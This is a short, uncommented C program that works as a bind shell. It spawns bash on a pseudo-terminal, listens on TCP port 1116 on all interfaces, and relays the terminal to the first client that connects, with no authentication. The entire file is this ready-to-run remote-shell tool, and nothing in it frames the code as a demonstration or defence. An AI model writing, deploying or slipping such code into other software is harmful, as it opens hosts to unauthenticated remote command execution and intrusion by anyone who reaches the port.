#define _XOPEN_SOURCE 600
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void child(int m)
{
	if (setsid() < 0) {
		perror("setsid");
		exit(1);
	}

	unlockpt(m);
	int s = open(ptsname(m), O_RDWR);
	if (s < 0) {
		perror("open");
		exit(1);
	}

	close(m);
	for (int i = 0; i < 3; i++)
		dup2(s, i);

	close(s);
	execlp("bash", "bash", NULL);
}

void loop(int c, int m)
{
	struct pollfd p[2] = { {c, POLLIN}, {m, POLLIN} };
	while (poll(p, 2, -1) > 0) {
		for (int i = 0; i < 2; i++) {
			if (p[i].revents & POLLIN) {
				char b[4096];
				ssize_t n = read(p[i].fd, b, sizeof(b));
				write(p[(i + 1) % 2].fd, b, n);
			}
		}
	}
}

int serve(const char *port)
{
	struct addrinfo *a, *l, hint = {
		.ai_flags = AI_PASSIVE,
		.ai_family = AF_INET,
		.ai_socktype = SOCK_STREAM
	};

	getaddrinfo(NULL, port, &hint, &l);
	for (a = l; a; a = a->ai_next) {
		int f = socket(a->ai_family, a->ai_socktype, a->ai_protocol);
		if (f < 0) {
			perror("socket");
			continue;
		}

		if (!bind(f, a->ai_addr, a->ai_addrlen)) {
			listen(f, 10);
			return accept(f, NULL, NULL);
		}

		perror("bind");
		close(f);
	}

	exit(1);
}

int main(void)
{
	int m = posix_openpt(O_RDWR);
	if (!fork())
		child(m);

	int c = serve("1116");
	loop(c, m);
}
